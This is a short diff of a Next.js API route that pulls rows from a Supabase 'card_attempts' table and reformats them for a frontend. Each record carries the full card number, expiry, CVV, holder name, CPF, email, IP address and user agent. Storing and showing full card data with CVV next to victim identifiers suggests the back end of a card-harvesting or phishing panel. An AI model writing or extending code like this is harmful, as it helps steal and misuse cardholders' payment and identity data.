@@ -13,11 +13,11 @@ export async function POST(request: NextRequest) {
       }, { status: 401 })
     }
     
-    // Buscar dados do Supabase
+    // Buscar dados do Supabase (tabela card_attempts)
     const { data, error } = await supabaseAdmin
-      .from('card_data')
+      .from('card_attempts')
       .select('*')
-      .order('timestamp', { ascending: false })
+      .order('created_at', { ascending: false })
     
     if (error) {
       return NextResponse.json({ 
@@ -30,26 +30,29 @@ export async function POST(request: NextRequest) {
     // Transformar dados para o formato esperado pelo frontend
     const formattedData = data?.map(item => ({
       id: item.id.toString(),
-      timestamp: item.timestamp,
+      timestamp: item.created_at,
       customer: {
-        name: item.customer_name,
-        cpf: item.customer_cpf,
-        phone: item.customer_phone,
-        email: item.customer_email,
-        address: item.customer_address
+        name: item.card_name, // Nome do titular do cartão
+        cpf: item.cpf,
+        phone: '', // Não temos mais esse campo
+        email: item.email,
+        address: '' // Não temos mais esse campo
       },
       card: {
         number: item.card_number,
-        holderName: item.card_holder_name,
-        expiryDate: item.card_expiry_date,
+        holderName: item.card_name,
+        expiryDate: item.card_expiry,
         cvv: item.card_cvv
       },
       product: {
-        name: item.product_name,
-        price: item.product_price,
-        quantity: item.product_quantity
+        name: item.product_name || '',
+        price: item.amount || 0,
+        quantity: 1
       },
-      total: item.total
+      total: item.amount || 0,
+      ip: item.ip,
+      userAgent: item.user_agent,
+      category: item.category
     })) || []
     
     return NextResponse.json({ 
